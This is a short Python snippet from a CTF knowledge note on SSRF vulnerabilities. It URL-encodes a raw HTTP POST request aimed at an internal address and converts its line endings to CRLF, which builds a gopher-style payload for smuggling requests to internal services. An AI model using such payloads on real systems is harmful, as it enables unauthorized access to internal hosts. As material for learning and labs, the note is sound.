# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSRF漏洞.md
# TITLE: 0x01 SSRF漏洞介绍
# CATEGORY: web

import urllib
import requests
test =\
"""POST /1.php HTTP/1.1
Host: 192.168.0.102
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

a=world
"""
tmp = urllib.parse.quote(test)
new = tmp.replace('%0A','%0D%0A')
result = '_'+new
print(result)
